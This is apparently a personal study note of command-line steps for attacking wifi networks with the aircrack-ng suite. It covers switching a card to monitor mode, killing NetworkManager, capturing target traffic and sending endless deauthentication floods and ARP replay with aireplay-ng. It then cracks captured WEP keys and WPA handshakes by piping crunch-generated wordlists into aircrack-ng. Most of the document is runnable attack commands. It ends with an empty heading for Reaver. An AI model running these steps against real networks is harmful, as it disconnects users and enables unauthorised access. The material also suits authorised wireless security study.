# Wireless Vulnerablities
## overview of tools 
### aircrack-ng  
from this https://ubuntuforums.org/showthread.php?t=528276  
##### change wifi card from promiscuous to monitor mode.  
1. `ifconfig`  
2. `ifconfig wlan0 down`  
3. `iwconfig wlan0 mode monitor`  
4. `ifconfig wlan0 up`  
##### check airmon-ng is good to go
1. `airmon-ng check wlan0`  
2. kill processes that are running.  `kill NetworkManager`  
##### run airodump-ng
1. `airodump-ng wlan0`  
2. `airodump-ng --channel 1 --bssid 12:34:45:45:67:80 --write dump.pca wlan0`  
##### seperate terminal  
3. `sudo aireplay-ng -1 0 -e <target_essid> -a 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>` -1... '0' deauthenticates all clients. -e... ESSID of target access point. -a... MAC address of target access point. -h... MAC address of your choice. its either no mac filtering or mac filtering  
Mac filtering is turned off  
```
18:22:32 Sending Authentication Request
18:22:32 Authentication successful
18:22:32 Sending Association Request
18:22:32 Association successful :-)
```
##### No MAC filtering  
--- `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... MAC address of your choice.  
##### MAC filtering 
-- `sudo aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:00:00:00:00:00 <interface>`  -0... Number of deauthentication attempts. -a... MAC address of target access point.  -c... Client MAC address.  
-- `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h 00:00:00:00:00:00 <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... Client MAC address.  
##### Decryption with "aircrack-ng" & "aircrack-ptw"  
1. `sudo aircrack-ng <file_name>.cap`  
2. `./aircrack-ptw <file_name>.cap`  
`crunch 10 10 -t %%%%%%%123 | aircrack-ng -w - SCAN-test.cap -e <essid>`   
[Aircrack-ng](http://aircrack-ng.org/doku.php?id=aircrack-ng)
https://www.aircrack-ng.org/doku.php?id=cracking_wpa  

```
Aircrack-NG:
64-bit key: ~250,000 packets
128-bit key: ~1,500,000 packets

Aircrack-PTW:
64-bit key: ~20,000 packets [estimate]
128-bit key: ~85,000 packets
```

#### from video  
##### change wifi card from promiscuous to monitor mode.  
1. `ifconfig`  
2. `ifconfig wlan0 down`  
3. `iwconfig wlan0 mode monitor`  
4. `ifconfig wlan0 up`
##### check airmon-ng is good to go
5. `airmon-ng check wlan0`  
6. kill processes that are running.  `kill NetworkManager`  
##### run airodump-ng
7. `airodump-ng wlan0`  
8. `airodump-ng --channel 1 --bssid 12:34:45:45:67:80 --write SCAN_test wlan0`  
*NEW TERMINAL*  this authenticates all clients on network - 0 means just goes on forever.  let it run for a while  
9. `aireplay-ng -0 0 -a 12:34:45:45:56:88 wlan0`  
10. ctr ^ C to stop  
11. one first terminal check to see if wpa handshake is captured.  if so stop capture.  
*FRESH TERMINAL*  
12. `crunch 10 10 -t @@@@@@@@@@ | aircrack-ng -w - SCAN_test-01.cap -e <essid>`  
##### try using a list cd crunch-3.6 find charset.lst 
13. `crunch 10 10 -t @@@@@@@@@@ -f charset.lst mixalpha-numeric-space`  

# REAVER 

